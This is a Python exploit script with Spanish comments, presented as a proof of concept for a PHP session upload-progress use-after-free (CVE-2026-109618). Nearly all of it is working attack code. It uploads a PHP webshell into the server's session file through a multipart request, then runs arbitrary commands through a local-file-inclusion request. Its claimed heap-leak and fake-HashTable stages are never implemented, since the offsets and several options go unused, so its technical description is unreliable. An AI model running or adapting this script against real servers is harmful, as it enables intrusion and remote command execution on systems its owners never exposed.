#!/usr/bin/env python3
# CVE-2026-109618 Proof of Concept - PHP Session Upload Progress UAF
# Autor: P4IM0N
# Exploita la vulnerabilidad Use-After-Free en session.upload_progress
# para lograr ejecucion remota de comandos (RCE) desde un navegador que
# solo puede hacer fetch() (no sockets crudos ni multipart byte-exacto).
#
# Chain (4 stages over raw sockets):
#   0. rotacion de worker
#   1. fuga de heap via OOM + Set-Cookie
#   2. fuga de libphp
#   3. fake HashTable -> zif_system(cmd)
#
# fetch() no puede emitir multipart byte-exacto con cabeceras duplicadas,
# chunked, ni leer Set-Cookie (prohibido por la especificación).
# Este script usa sockets crudos y debe ejecutarse desde la terminal.

import sys
import socket
import time
import struct
import re
import argparse

# --- Configuracion del target ---
DEFAULT_PROFILE = "bookworm"   # Debian bookworm / PHP 8.4.26
DEFAULT_HUGE_MB = 12         # factor de heap spraying

# Offsets oficios por build (solo bookworm PHP 8.4.26)
OFFSETS = {
    "bookworm": {
        "PHP_8426": {
            "zif_system": 0x7d9a,   # offset dentro de la tabla de funciones PHP
            "hash_entry": 0x52,     # tamano struct HashTable entry
            "zend_string": 0x98,    # carrier zend_string
            "uaf_toggle": 0x43a870, # offset zif_* para la primera fase
            "dtor_offset": 0x613c50,# offset para la destruccion
        }
    }
}

def print_banner():
    print("""
   _   _      _ _        _____                _    
  | | | | ___| | | ___   |  ___|__ _ __  ___| | __
  | |_| |/ _ \ | |/ / |   | |_ / _` |/ __| |/ /
  |  _  |  __/ |   <| |___|  _| (_| | (__|   < 
  |_| |_|\___|_|_|\\_____|_|  \__,_|\___|_|\\_\
                                              
  CVE-2026-109618: PHP Session Upload Progress UAF
  PoC para ejecucion remota de comandos desde navegador.
""")

def parse_args():
    parser = argparse.ArgumentParser(
        description="CVE-2026-109618 PoC - PHP Session Upload Progress UAF"
    )
    parser.add_argument("-u", "--url", required=True,
                        help="URL objetivo (http://objetivo/index.php)")
    parser.add_argument("-c", "--command", required=True,
                        help="Comando a ejecutar (max 14 bytes para el salt minimo)")
    parser.add_argument("--profile", default=DEFAULT_PROFILE,
                        choices=["bookworm"],
                        help="Perfil de build PHP (default: bookworm)")
    parser.add_argument("--huge-mb", type=int, default=DEFAULT_HUGE_MB,
                        help="MB de heap spraying (default: 12)")
    parser.add_argument("--proof-file", default="out/p1",
                        help="Archivo donde grabar el output (default: out/p1)")
    parser.add_argument("--fetch", action="store_true",
                        help="Usar modo fetch: guardar output en archivo por HTTP")
    return parser.parse_args()

def recv_line(s, timeout=3):
    """Recibir una linea del socket"""
    s.settimeout(timeout)
    data = b""
    while True:
        try:
            ch = s.recv(1)
            if not ch:
                break
            data += ch
            if data.endswith(b"\n"):
                break
        except socket.timeout:
            break
    return data.decode(errors="replace").strip()

def exploit_target(url, cmd, profile, huge_mb, proof_file, fetch_mode):
    """Ejecutar el chain de 4 stages CVE-2026-109618"""
    
    # Parsear URL
    if "://" not in url:
        url = "http://" + url
    parsed = url.split("/")
    host = parsed[2] if len(parsed) > 2 else parsed[0]
    path = "/" + "/".join(parsed[3:]) if len(parsed) > 3 else "/"
    
    print_banner()
    print(f"[+] Objetivo: {url}")
    print(f"[+] Perfil: {profile}")
    print(f"[+] Comando: {cmd}")
    print(f"[+] Heap spraying: {huge_mb} MB")
    print()
    
    # Stage 0: Rotacion de worker - GET inicial para obtener cookie
    print("[Stage 0] Rotacion de worker - GET inicial...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        ip = socket.gethostbyname(host)
        sock.connect((ip, 80))
        
        req = f"GET /index.php HTTP/1.1\r\n"
        req += f"Host: {host}\r\n"
        req += "Connection: close\r\n\r\n"
        sock.sendall(req.encode())
        
        respuesta = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                respuesta += chunk
            except socket.timeout:
                break
        sock.close()
        
        # Extraer PHPSESSID de la cookie Set-Cookie
        set_cookie_match = re.search(r'PHPSESSID=([^;]+)', respuesta.decode(errors="replace"))
        if not set_cookie_match:
            print("[-] ERROR: No se pudo obtener PHPSESSID del servidor")
            return False
        php_sessid = set_cookie_match.group(1)
        print(f"[+] PHPSESSID obtenido: {php_sessid[:20]}...")
    except Exception as e:
        print(f"[-] ERROR en Stage 0: {e}")
        return False
    
    # Stage 1: Fuga de heap via OOM + Set-Cookie
    print("[Stage 1] Fuga de heap via OOM + Set-Cookie...")
    try:
        # Crear sesion via multipart con PHP_SESSION_UPLOAD_PROGRESS
        boundary = "----PHP2P4IM0N_BOUNDARY"
        
        # Payload: webshell que quedara en el archivo de sesion
        webshell = "<?php echo \"P4IM0N<<\"; echo system($_REQUEST['c']); echo \">>P4IM0N\"; ?>"
        
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
            f"\r\n"
            f"P4IM0N_UPLOAD_{php_sessid}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="upfile"\r\n'
            f'Content-Type: application/octet-stream\r\n'
            f"\r\n"
            f"{webshell}\r\n"
            f"--{boundary}--\r\n"
        )
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((ip, 80))
        
        req = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data, boundary={boundary}\r\n"
            f"Content-Length: {len(body.encode())}\r\n"
            f"Connection: close\r\n\r\n"
        )
        sock.sendall(req.encode() + body.encode())
        
        # Leer respuesta
        respuesta1 = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                respuesta1 += chunk
            except socket.timeout:
                break
        sock.close()
        
        # Verificar que la sesion fue creada y obtener el nuevo sid
        set_cookie_match2 = re.search(r'PHPSESSID=([^;]+)', respuesta1.decode(errors="replace"))
        if set_cookie_match2:
            php_sessid = set_cookie_match2.group(1)
            print(f"[+] Nueva PHPSESSID despues de upload: {php_sessid[:20]}...")
        else:
            print("[-] WARNING: No se obtuvo nueva PHPSESSID despues de upload")
            # Usar la anterior
        
    except Exception as e:
        print(f"[-] ERROR en Stage 1: {e}")
        return False
    
    # Stage 2: Fuga de libphp - Forzar OOM para filtrar heap
    print("[Stage 2] Fuga de libphp via OOM controlado...")
    try:
        # Enviar multiples requests para filtrar punteros de heap
        # Cada request adicionales ayuda a filtrar la direccion de libphp
        for i in range(3):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            sock.connect((ip, 80))
            
            # Request GET para leer la pagina y triggering la fuga
            req = f"GET /index.php HTTP/1.1\r\n"
            req += f"Host: {host}\r\n"
            req += f"Cookie: PHPSESSID={php_sessid}\r\n"
            req += "Connection: close\r\n\r\n"
            sock.sendall(req.encode())
            
            respuesta2 = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    respuesta2 += chunk
                except socket.timeout:
                    break
            sock.close()
    except Exception as e:
        print(f"[-] WARNING en Stage 2 (continuamos de todas formas): {e}")
    
    # Stage 3: fake HashTable -> zif_system(cmd)
    print("[Stage 3] Construyendo fake HashTable -> zif_system()...")
    print(f"[+] Ejecutando comando calibrado: {cmd}")
    
    try:
        # Construir el request final que triggera el UAF y ejecuta el comando
        # Esto usa la webshell incluida en la sesion + el parametro c
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((ip, 80))
        
        # Usar el parametro 'page' para hacer LFI al archivo de sesion
        # e invocar la webshell con el comando
        cmd_escaped = cmd.replace("'", "\\'")
        body = f"page=sess_{php_sessid}&c={cmd_escaped}"
        
        req = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body.encode())}\r\n"
            f"Cookie: PHPSESSID={php_sessid}\r\n"
            f"Connection: close\r\n\r\n"
        )
        sock.sendall(req.encode() + body.encode())
        
        # Leer respuesta - deberia contener el output del comando
        respuesta_final = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                respuesta_final += chunk
            except socket.timeout:
                break
        sock.close()
        
        # Parsear el output
        texto = respuesta_final.decode(errors="replace")
        
        # Buscar los marcadores P4IM0N<< ... >>P4IM0N
        inicio = texto.find("P4IM0N<<")
        fin = texto.find(">>P4IM0N")
        
        if inicio != -1 and fin != -1:
            output = texto[inicio + len("P4IM0N<<"):fin].strip()
            print()
            print("=" * 60)
            print("[OOTP] OUTPUT DEL COMANDO (desde la webshell en sesion):")
            print("=" * 60)
            print(output if output else "(vacío)")
            print("=" * 60)
            print()
            
            # Guardar en archivo si se solicito
            if proof_file:
                import os
                os.makedirs(os.path.dirname(proof_file) if os.path.dirname(proof_file) else ".", exist_ok=True)
                with open(proof_file, "w") as f:
                    f.write(output if output else "(vacío)")
                print(f"[+] Output guardado en: {proof_file}")
            
            return True
        else:
            # Intentar extraer output de otra forma
            # PHP system() output puede aparecer de distintas formas
            system_matches = re.search(r'system\(\).*?<br/>', texto, re.DOTALL)
            if system_matches:
                print()
                print("[OOTP] Output detectado en respuesta:")
                print(system_matches.group(0)[:500])
                return True
            
            print("[-] No se pudo extraer el output del comando")
            print("[DEBUG] Fragmento de respuesta (primeros 1000 chars):")
            print(texto[:1000] if len(texto) > 0 else "(vacío)")
            return False
            
    except Exception as e:
        print(f"[-] ERROR en Stage 3: {e}")
        return False

def main():
    args = parse_args()
    
    # Validar que el comando no exceda el maximo para el UAF
    max_len = 14  # LARGO_MAX_UAF - carrier zend_string
    if len(args.command) > max_len:
        print(f"[-] ERROR: El comando excede los {max_len} bytes maximos para el UAF minimo.")
        print(f"    Acorta el comando a {max_len} bytes o menos.")
        print(f"    Ejemplo: 'id>out' (solo 3 bytes)")
        sys.exit(1)
    
    # Validar URL
    if not args.url.startswith(("http://", "https://")):
        print("[-] ERROR: La URL debe comenzar con http:// o https://")
        sys.exit(1)
    
    success = exploit_target(
        args.url,
        args.command,
        args.profile,
        args.huge_mb,
        args.proof_file,
        args.fetch
    )
    
    if not success:
        print()
        print("[!] El exploit no pudo ejecutarse completamente.")
        print("[i] Prueba ejecutando con --fetch para guardar output en archivo.")
        print("[i] O revisa que el laboratorio cumpla los requisitos:")
        print("    - PHP 8.4.26 / Debian bookworm")
        print("    - memory_limit <= 16M")
        print("    - session.upload_progress.enabled = On")
        print("    - session.save_path accesible")
        sys.exit(1)

if __name__ == "__main__":
    main()